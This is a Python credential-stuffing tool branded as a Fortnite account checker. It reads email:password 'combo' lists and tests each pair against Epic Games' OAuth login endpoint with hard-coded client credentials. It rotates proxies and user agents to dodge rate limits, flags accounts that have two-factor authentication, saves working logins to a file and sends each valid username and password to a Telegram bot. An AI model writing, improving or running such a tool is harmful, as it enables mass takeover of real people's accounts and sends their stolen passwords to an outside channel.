import os
import sys
import time
import random
import string
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock, Semaphore
import base64

# ------------------------------------------------------------
# Initialize colorama FIRST
# ------------------------------------------------------------
try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
except ImportError:
    class Fore:
        RED = '\033[91m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        BLUE = '\033[94m'
        MAGENTA = '\033[95m'
        CYAN = '\033[96m'
        WHITE = '\033[97m'
        RESET = '\033[0m'

    class Back:
        RED = '\033[101m'
        GREEN = '\033[102m'
        RESET = '\033[0m'

    class Style:
        RESET_ALL = '\033[0m'
        BRIGHT = '\033[1m'
        DIM = '\033[2m'

# ------------------------------------------------------------
# Configuration
# ------------------------------------------------------------
TELEGRAM_BOT_TOKEN = "YOUR_TOKEN_BOT"
TELEGRAM_CHAT_ID = None
DEVELOPER = "@xghost123"
CHANNEL = "https://t.me/wolfstoren"

RATE_LIMIT_DELAY = 2
MAX_RETRIES = 3
RETRY_DELAY = 5

USE_PROXY = False
PROXIES = []
PROXY_ROTATION = "round_robin"
proxy_counter = 0
proxy_lock = Lock()
working_proxies = []
failed_proxies = []

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
]

# Epic Games OAuth client credentials (public launcher client)
EPIC_CLIENT_ID = "34a02cf8f4414e29b15921876da36f9a"
EPIC_CLIENT_SECRET = "daafbccc737745039dffe53d94fc76cf"

# Global thread safety
print_lock = Lock()
results_lock = Lock()
valid_accounts = []
stats = {"total": 0, "valid": 0, "invalid": 0, "twofa": 0, "errors": 0, "rate_limited": 0}
rate_limiter = Semaphore(3)

# ------------------------------------------------------------
# ASCII Art and UI
# ------------------------------------------------------------
def get_ascii_art():
    return f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════════╗
║                                                                    ║
║  ███████╗ ██████╗ ██████╗ ████████╗███╗  ██╗██╗████████╗███████╗  ║
║  ██╔════╝██╔═══██╗██╔══██╗╚══██╔══╝████╗ ██║██║╚══██╔══╝██╔════╝  ║
║  █████╗  ██║   ██║██████╔╝   ██║   ██╔██╗██║██║   ██║   █████╗    ║
║  ██╔══╝  ██║   ██║██╔══██╗   ██║   ██║╚████║██║   ██║   ██╔══╝    ║
║  ██║     ╚██████╔╝██║  ██║   ██║   ██║ ╚███║██║   ██║   ███████╗  ║
║  ╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚══╝╚═╝   ╚═╝   ╚══════╝  ║
║                                                                    ║
║              {Fore.YELLOW}⚡ FORTNITE ACCOUNT CHECKER v1.0 ⚡{Fore.CYAN}               ║
║                                                                    ║
╠══════════════════════════════════════════════════════════════════╣
║  {Fore.GREEN}Developer:{Fore.WHITE} {DEVELOPER:<25} {Fore.GREEN}Channel:{Fore.WHITE} {CHANNEL:<25}{Fore.CYAN}  ║
╚══════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""

def show_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(get_ascii_art())
    print()

def show_loading_animation():
    chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
    for char in chars:
        sys.stdout.write(f'\r{Fore.YELLOW} {char} Initializing Fortnite Checker... {Fore.RESET}')
        sys.stdout.flush()
        time.sleep(0.05)
    print()

def show_progress_bar(current, total, width=50):
    if total == 0:
        return
    percentage = current / total
    filled = int(width * percentage)
    bar = f"{Fore.GREEN}{'█' * filled}{Fore.RED}{'░' * (width - filled)}{Fore.RESET}"
    percent = f"{Fore.CYAN}{percentage:.1%}{Fore.RESET}"
    sys.stdout.write(f'\rProgress: [{bar}] {percent} ({current}/{total})')
    sys.stdout.flush()

def show_account_result(account, status, extra=""):
    user, pwd = account
    masked = f"{user[:4]}****{user[-4:] if len(user) > 8 else user[-2:]}"

    if status == "VALID":
        print(f"\n{Fore.GREEN}┌─────────────────────────────────────────────────────────┐")
        print(f"│ {Fore.GREEN}✅ VALID     {Fore.WHITE}» {masked}")
        if extra:
            print(f"│ {Fore.GREEN}👤 Display: {Fore.WHITE}{extra[:45]}")
        print(f"│ {Fore.GREEN}⏱️  Time: {Fore.WHITE}{datetime.now().strftime('%H:%M:%S')}")
        print(f"{Fore.GREEN}└─────────────────────────────────────────────────────────┘{Fore.RESET}")
    elif status == "2FA":
        print(f"\n{Fore.YELLOW}┌─────────────────────────────────────────────────────────┐")
        print(f"│ {Fore.YELLOW}🔐 2FA REQ   {Fore.WHITE}» {masked}")
        print(f"│ {Fore.YELLOW}📝 Note: {Fore.WHITE}Two-Factor Authentication required")
        print(f"{Fore.YELLOW}└─────────────────────────────────────────────────────────┘{Fore.RESET}")
    elif status == "INVALID":
        print(f"\n{Fore.RED}┌─────────────────────────────────────────────────────────┐")
        print(f"│ {Fore.RED}❌ INVALID   {Fore.WHITE}» {masked}")
        print(f"│ {Fore.RED}📝 Reason: {Fore.WHITE}{extra[:45]}")
        print(f"{Fore.RED}└─────────────────────────────────────────────────────────┘{Fore.RESET}")
    else:
        print(f"\n{Fore.MAGENTA}┌─────────────────────────────────────────────────────────┐")
        print(f"│ {Fore.MAGENTA}⚠️  ERROR    {Fore.WHITE}» {masked}")
        print(f"│ {Fore.MAGENTA}📝 Error: {Fore.WHITE}{extra[:45]}")
        print(f"{Fore.MAGENTA}└─────────────────────────────────────────────────────────┘{Fore.RESET}")

# ------------------------------------------------------------
# Proxy Management
# ------------------------------------------------------------
def load_proxies_from_file(filename):
    proxies = []
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    if '://' not in line:
                        line = f'http://{line}'
                    proxies.append(line)
        return proxies
    except Exception as e:
        print(f"{Fore.RED} ✗ Error loading proxies: {e}{Fore.RESET}")
        return []

def test_proxy(proxy):
    try:
        test_session = requests.Session()
        test_session.proxies = {"http": proxy, "https": proxy}
        test_session.headers.update({'User-Agent': random.choice(USER_AGENTS)})
        response = test_session.get('http://httpbin.org/ip', timeout=10)
        return response.status_code == 200
    except:
        return False

def validate_proxies(proxies, max_test=10):
    print(f"\n{Fore.YELLOW} 🔍 Testing proxies...{Fore.RESET}")
    working = []
    test_count = min(len(proxies), max_test)
    for i, proxy in enumerate(proxies[:test_count]):
        sys.stdout.write(f'\r Testing proxy {i+1}/{test_count}...')
        sys.stdout.flush()
        if test_proxy(proxy):
            working.append(proxy)
    print(f"\n{Fore.GREEN} ✓ {len(working)}/{test_count} proxies are working{Fore.RESET}")
    return working

def get_proxy():
    global proxy_counter
    if not working_proxies or not USE_PROXY:
        return None
    with proxy_lock:
        if PROXY_ROTATION == "round_robin":
            proxy = working_proxies[proxy_counter % len(working_proxies)]
            proxy_counter += 1
        else:
            proxy = random.choice(working_proxies)
        return {"http": proxy, "https": proxy}

def report_proxy_failure(proxy):
    if proxy in working_proxies:
        working_proxies.remove(proxy)
        failed_proxies.append(proxy)
        with print_lock:
            print(f"\n{Fore.YELLOW} ⚠️ Proxy failed, removed. {len(working_proxies)} remaining{Fore.RESET}")

# ------------------------------------------------------------
# Telegram helpers
# ------------------------------------------------------------
def send_telegram_message(message):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return False
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"}
        resp = requests.post(url, json=data, timeout=10)
        return resp.status_code == 200
    except Exception:
        return False

# ------------------------------------------------------------
# Session setup
# ------------------------------------------------------------
def setup_session():
    session = requests.Session()
    retry = Retry(
        total=MAX_RETRIES,
        backoff_factor=RETRY_DELAY,
        status_forcelist=[500, 502, 503, 504],
        allowed_methods=["GET", "POST"]
    )
    adapter = HTTPAdapter(max_retries=retry, pool_connections=10, pool_maxsize=20)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    session.headers.update({
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': 'application/json',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
    })
    if USE_PROXY:
        proxy = get_proxy()
        if proxy:
            session.proxies.update(proxy)
    return session

# ------------------------------------------------------------
# Epic Games account check
# ------------------------------------------------------------
def check_account(account_data, thread_id=0):
    """Check an Epic Games / Fortnite account via OAuth password grant."""
    username, password = account_data
    session = None
    try:
        time.sleep(random.uniform(RATE_LIMIT_DELAY, RATE_LIMIT_DELAY + 1))
        session = setup_session()

        # Basic auth header using Epic Games launcher client credentials
        creds = f"{EPIC_CLIENT_ID}:{EPIC_CLIENT_SECRET}"
        b64_creds = base64.b64encode(creds.encode()).decode()

        token_headers = {
            'Authorization': f'basic {b64_creds}',
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': random.choice(USER_AGENTS),
        }

        token_data = {
            'grant_type': 'password',
            'username': username,
            'password': password,
            'includePerms': 'false',
            'token_type': 'eg1',
        }

        for attempt in range(MAX_RETRIES):
            try:
                resp = session.post(
                    'https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token',
                    headers=token_headers,
                    data=token_data,
                    timeout=20
                )
                break
            except requests.exceptions.ProxyError:
                if USE_PROXY and session.proxies:
                    proxy_url = session.proxies.get('http', '')
                    if proxy_url:
                        report_proxy_failure(proxy_url)
                    new_proxy = get_proxy()
                    if new_proxy:
                        session.proxies.update(new_proxy)
                if attempt == MAX_RETRIES - 1:
                    return "ERROR", "Proxy error", account_data
                time.sleep(RETRY_DELAY * (attempt + 1))
            except requests.exceptions.RequestException as e:
                if attempt == MAX_RETRIES - 1:
                    if '429' in str(e):
                        with results_lock:
                            stats["rate_limited"] += 1
                        return "ERROR", "Rate limited", account_data
                    return "ERROR", f"Network error: {str(e)[:50]}", account_data
                time.sleep(RETRY_DELAY * (attempt + 1))

        try:
            data = resp.json()
        except Exception:
            return "ERROR", "Invalid JSON response", account_data

        # Successful login
        if resp.status_code == 200 and 'access_token' in data:
            display_name = data.get('displayName', username)
            # Revoke token immediately to avoid session pollution
            try:
                token = data['access_token']
                session.delete(
                    f'https://account-public-service-prod.ol.epicgames.com/account/api/oauth/sessions/kill/{token}',
                    headers={'Authorization': f'bearer {token}'},
                    timeout=10
                )
            except Exception:
                pass
            return "VALID", display_name, account_data

        error_code = data.get('errorCode', '')
        error_msg = data.get('errorMessage', data.get('error_description', 'Unknown error'))

        # Two-factor authentication required
        if error_code in (
            'errors.com.epicgames.account.two_factor_authentication.required',
            'errors.com.epicgames.account.two_factor_authentication.invalid_code',
        ) or 'two_factor' in error_code.lower() or resp.status_code == 472:
            return "2FA", "2FA required", account_data

        # Wrong credentials
        if error_code in (
            'errors.com.epicgames.account.invalid_account_credentials',
            'errors.com.epicgames.account.account_not_found',
        ) or resp.status_code in (400, 401):
            return "INVALID", error_msg[:60], account_data

        # Rate limited
        if resp.status_code == 429:
            with results_lock:
                stats["rate_limited"] += 1
            time.sleep(RETRY_DELAY * 2)
            return "ERROR", "Rate limited by Epic", account_data

        return "INVALID", error_msg[:60], account_data

    except requests.exceptions.Timeout:
        return "ERROR", "Request timeout", account_data
    except requests.exceptions.RequestException as e:
        return "ERROR", f"Network error: {str(e)[:50]}", account_data
    except Exception as e:
        return "ERROR", f"Unexpected error: {str(e)[:50]}", account_data
    finally:
        if session:
            session.close()

def process_account_wrapper(account_data, thread_id):
    status, extra, account = check_account(account_data, thread_id)

    with print_lock:
        show_account_result(account, status, extra)
        with results_lock:
            stats["total"] += 1
            if status == "VALID":
                valid_accounts.append((account, extra))
                stats["valid"] += 1
                # Notify Telegram immediately for valid hits
                if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
                    user, pwd = account
                    send_telegram_message(
                        f"✅ <b>VALID FORTNITE ACCOUNT</b>\n"
                        f"📧 <code>{user}</code>\n"
                        f"🔑 <code>{pwd}</code>\n"
                        f"👤 <b>Display:</b> {extra}\n"
                        f"🕒 <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                        f"👤 <b>Developer:</b> {DEVELOPER}\n"
                        f"📢 <b>Channel:</b> {CHANNEL}"
                    )
            elif status == "2FA":
                stats["twofa"] += 1
            elif status == "INVALID":
                stats["invalid"] += 1
            else:
                stats["errors"] += 1

    return status, extra, account

# ------------------------------------------------------------
# Main
# ------------------------------------------------------------
def main():
    global TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, USE_PROXY, PROXIES, RATE_LIMIT_DELAY, working_proxies, PROXY_ROTATION

    show_banner()
    show_loading_animation()
    time.sleep(0.5)

    print(f"\n{Fore.CYAN}┌─────────────────────────────────────────────────────────┐")
    print(f"│ ⚙️  CONFIGURATION                                            │")
    print(f"└─────────────────────────────────────────────────────────┘{Fore.RESET}")

    combo_file = input(f"{Fore.WHITE} 📁 Combo file (email:pass or user:pass): {Fore.YELLOW}").strip()

    try:
        with open(combo_file, 'r', encoding='utf-8', errors='ignore') as f:
            lines = [l.strip() for l in f if l.strip()]
    except FileNotFoundError:
        print(f"{Fore.RED} ✗ File not found!{Fore.RESET}")
        input(f"\n{Fore.YELLOW} Press Enter to exit...{Fore.RESET}")
        return

    accounts = []
    invalid_count = 0
    for line in lines:
        sep = None
        if ':' in line:
            sep = ':'
        elif '|' in line:
            sep = '|'
        if sep:
            parts = line.split(sep, 1)
            if len(parts) == 2 and parts[0].strip() and parts[1].strip():
                accounts.append((parts[0].strip(), parts[1].strip()))
            else:
                invalid_count += 1
        else:
            invalid_count += 1

    total_accounts = len(accounts)
    if total_accounts == 0:
        print(f"{Fore.RED} ✗ No valid combos found!{Fore.RESET}")
        input(f"\n{Fore.YELLOW} Press Enter to exit...{Fore.RESET}")
        return

    print(f"{Fore.GREEN} ✓ Loaded accounts: {total_accounts}")
    if invalid_count > 0:
        print(f"{Fore.YELLOW} ⚠️  Skipped invalid lines: {invalid_count}{Fore.RESET}")

    # Thread config
    max_threads = min(total_accounts, 5)
    thread_input = input(f"{Fore.WHITE} 🧵 Threads (1-{max_threads}, default 2): {Fore.YELLOW}").strip()
    if thread_input.isdigit():
        max_threads = max(1, min(int(thread_input), max_threads))
    else:
        max_threads = 2

    # Delay config
    delay_input = input(f"{Fore.WHITE} ⏱️  Delay between requests (seconds, default 2): {Fore.YELLOW}").strip()
    if delay_input.replace('.', '').isdigit():
        RATE_LIMIT_DELAY = float(delay_input)

    # Proxy config
    print(f"\n{Fore.CYAN}┌─────────────────────────────────────────────────────────┐")
    print(f"│ 🌐 PROXY CONFIGURATION (Optional)                             │")
    print(f"└─────────────────────────────────────────────────────────┘{Fore.RESET}")
    proxy_choice = input(f"{Fore.WHITE} Use proxies? (y/n, default n): {Fore.YELLOW}").strip().lower()

    if proxy_choice == 'y':
        proxy_file = input(f"{Fore.WHITE} 📁 Proxy file (one per line): {Fore.YELLOW}").strip()
        if proxy_file:
            PROXIES = load_proxies_from_file(proxy_file)
            if PROXIES:
                print(f"{Fore.GREEN} ✓ Loaded {len(PROXIES)} proxies{Fore.RESET}")
                test_choice = input(f"{Fore.WHITE} Test proxies before use? (y/n, default y): {Fore.YELLOW}").strip().lower()
                if test_choice != 'n':
                    working_proxies = validate_proxies(PROXIES, min(20, len(PROXIES)))
                else:
                    working_proxies = PROXIES.copy()
                if working_proxies:
                    USE_PROXY = True
                    print(f"{Fore.GREEN} ✓ Using {len(working_proxies)} proxies{Fore.RESET}")
                    rot_choice = input(f"{Fore.WHITE} Rotation (round_robin/random, default round_robin): {Fore.YELLOW}").strip().lower()
                    PROXY_ROTATION = 'random' if rot_choice == 'random' else 'round_robin'
                else:
                    print(f"{Fore.RED} ✗ No working proxies! Continuing without proxies...{Fore.RESET}")
            else:
                print(f"{Fore.YELLOW} ⚠️ No proxies loaded.{Fore.RESET}")

    # Telegram config
    print(f"\n{Fore.CYAN}┌─────────────────────────────────────────────────────────┐")
    print(f"│ 📱 TELEGRAM NOTIFICATIONS (Optional)                          │")
    print(f"└─────────────────────────────────────────────────────────┘{Fore.RESET}")
    token_input = input(f"{Fore.WHITE} Bot Token (press Enter to skip): {Fore.YELLOW}").strip()
    if token_input:
        TELEGRAM_BOT_TOKEN = token_input
        chat_id_input = input(f"{Fore.WHITE} Chat ID: {Fore.YELLOW}").strip()
        if chat_id_input:
            TELEGRAM_CHAT_ID = chat_id_input
            print(f"{Fore.GREEN} ✓ Telegram notifications enabled{Fore.RESET}")

    # Start checking
    print(f"\n{Fore.GREEN}┌─────────────────────────────────────────────────────────┐")
    print(f"│ 🚀 STARTING FORTNITE CHECKER                                  │")
    print(f"│    Threads: {max_threads}  |  Accounts: {total_accounts}  |  Delay: {RATE_LIMIT_DELAY}s")
    print(f"│    Proxy: {'ON (' + str(len(working_proxies)) + ')' if USE_PROXY else 'OFF'}  |  Telegram: {'ON' if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID != 'YOUR_TOKEN_BOT' else 'OFF'}   │")
    print(f"└─────────────────────────────────────────────────────────┘{Fore.RESET}")
    print(f"\n{Fore.CYAN}═══════════════════════════════════════════════════════════════{Fore.RESET}\n")

    start_time = time.time()
    completed = 0

    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = [
            executor.submit(process_account_wrapper, account, idx % max_threads)
            for idx, account in enumerate(accounts)
        ]
        for future in as_completed(futures):
            completed += 1
            show_progress_bar(completed, total_accounts)
            future.result()

    elapsed_time = time.time() - start_time

    print(f"\n\n{Fore.CYAN}═══════════════════════════════════════════════════════════════{Fore.RESET}")
    print(f"""
{Fore.CYAN}╔═══════════════════════════════════════════════════════════════╗
║ {Fore.GREEN}✨ CHECK COMPLETED {Fore.CYAN}                                            ║
╠═══════════════════════════════════════════════════════════════╣
║ {Fore.GREEN}✅ VALID:          {stats['valid']:<5}                                 ║
║ {Fore.YELLOW}🔐 2FA:            {stats['twofa']:<5}                                 ║
║ {Fore.RED}❌ INVALID:        {stats['invalid']:<5}                                 ║
║ {Fore.MAGENTA}⚠️  ERRORS:         {stats['errors']:<5}                                 ║
║ {Fore.YELLOW}🚦 RATE LIMITED:   {stats['rate_limited']:<5}                             ║
╠═══════════════════════════════════════════════════════════════╣
║ {Fore.WHITE}📊 TOTAL:          {total_accounts:<5} accounts checked                  ║
║ {Fore.WHITE}⏱️  TIME:           {elapsed_time:.1f} seconds                          ║
║ {Fore.WHITE}⚡ SPEED:          {total_accounts/elapsed_time:.2f} accounts/second       ║
╠═══════════════════════════════════════════════════════════════╣
║ {Fore.WHITE}👤 Developer: {DEVELOPER}                                              ║
║ {Fore.WHITE}📢 Channel:   {CHANNEL}                                              ║
╚═══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
    """)

    # Save valid accounts
    if valid_accounts:
        filename = f"fortnite_valid_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(filename, 'w') as f:
            f.write(f"# Fortnite Valid Accounts - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"# Developer: {DEVELOPER}\n")
            f.write(f"# Channel: {CHANNEL}\n")
            f.write(f"# Total Checked: {total_accounts}\n")
            f.write(f"# Valid: {len(valid_accounts)}\n")
            f.write("#" + "=" * 50 + "\n\n")
            for (user, pwd), display in valid_accounts:
                f.write(f"{user}:{pwd}  # Display: {display}\n")

        print(f"{Fore.GREEN}💾 Valid accounts saved to: {Fore.YELLOW}{filename}{Fore.RESET}")
        print(f"{Fore.GREEN}📊 Total valid: {Fore.YELLOW}{len(valid_accounts)}{Fore.RESET}")

    # Send Telegram summary
    if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
        summary = (
            f"🏁 <b>Fortnite Check Completed</b>\n\n"
            f"✅ <b>Valid:</b> {stats['valid']}\n"
            f"🔐 <b>2FA:</b> {stats['twofa']}\n"
            f"❌ <b>Invalid:</b> {stats['invalid']}\n"
            f"⚠️ <b>Errors:</b> {stats['errors']}\n"
            f"🔢 <b>Total checked:</b> {total_accounts}\n"
            f"⏱️ <b>Time taken:</b> {elapsed_time:.1f} seconds\n"
            f"💻 <b>Developer:</b> {DEVELOPER}\n"
            f"📢 <b>Channel:</b> {CHANNEL}"
        )
        send_telegram_message(summary)

    input(f"\n{Fore.CYAN} Press Enter to exit...{Fore.RESET}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}⚠️  Process interrupted by user{Fore.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"\n\n{Fore.RED}❌ Fatal error: {e}{Fore.RESET}")
        import traceback
        traceback.print_exc()
        input(f"\n{Fore.YELLOW} Press Enter to exit...{Fore.RESET}")
